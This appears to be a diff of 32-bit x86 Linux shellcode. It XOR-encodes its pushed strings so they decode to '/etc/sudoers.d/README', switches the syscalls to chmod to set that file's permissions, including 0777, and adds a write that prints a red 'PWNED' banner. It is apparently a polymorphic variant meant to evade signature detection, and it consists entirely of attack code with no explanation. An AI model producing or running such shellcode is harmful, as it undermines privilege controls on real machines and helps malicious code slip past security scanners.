@@ -12,26 +12,42 @@ _start:
 	xor edx, edx
 	mov dl, 0x45
 	push edx
-	push 0x4d444145
-	push 0x522f642e
-	push 0x7372656f
+	mov edx, 0xd4ddd8dc
+	xor edx, 0x99999999
+	push edx
+	mov edx, 0xcbb6fdb7
+	xor edx, 0x99999999
+	push edx
+	mov edx, 0xeaebfcf6
+	xor edx, 0x99999999
+	push edx
 	push 0x6475732f
-	push 0x6374652f
+	mov edx, 0xfaedfcb6
+	xor edx, 0x99999999
+	push edx
 	mov ebx, esp
 	xor ecx, ecx
 	mov cx, 0x01ff
 	xor eax, eax
-	mov al, 90
+	mov al, 15
 	int 0x80
 
 	xor edx, edx
 	mov dl, 0x45
 	push edx
-	push 0x4d444145
-	push 0x522f642e
-	push 0x7372656f
+	mov edx, 0xd4ddd8dc
+	xor edx, 0x99999999
+	push edx
+	mov edx, 0xcbb6fdb7
+	xor edx, 0x99999999
+	push edx
+	mov edx, 0xeaebfcf6
+	xor edx, 0x99999999
+	push edx
 	push 0x6475732f
-	push 0x6374652f
+	mov edx, 0xfaedfcb6
+	xor edx, 0x99999999
+	push edx
 	mov ebx, esp
 	xor ecx, ecx
 	mov cl, 0x01
@@ -63,16 +79,40 @@ _start:
 	xor edx, edx
 	mov dl, 0x45
 	push edx
-	push 0x4d444145
-	push 0x522f642e
-	push 0x7372656f
+	mov edx, 0xd4ddd8dc
+	xor edx, 0x99999999
+	push edx
+	mov edx, 0xcbb6fdb7
+	xor edx, 0x99999999
+	push edx
+	mov edx, 0xeaebfcf6
+	xor edx, 0x99999999
+	push edx
 	push 0x6475732f
-	push 0x6374652f
+	mov edx, 0xfaedfcb6
+	xor edx, 0x99999999
+	push edx
 	mov ebx, esp
-	xor ecx, ecx
-	mov cx, 0x0120
+	mov ecx, 0x999998b9
+	xor ecx, 0x99999999
 	xor eax, eax
-	mov al, 90
+	mov al, 15
+	int 0x80
+
+	xor edx, edx
+	push edx
+	push 0x44454e57
+	push 0x506d3133
+	push 0x3b313b35
+	push 0x5b1b631b
+
+	xor ebx, ebx
+	mov bl, 0x1
+	mov ecx, esp
+	xor edx, edx
+	mov dl, 17
+	xor eax, eax
+	mov al, 0x4
 	int 0x80
 
 	xor eax, eax
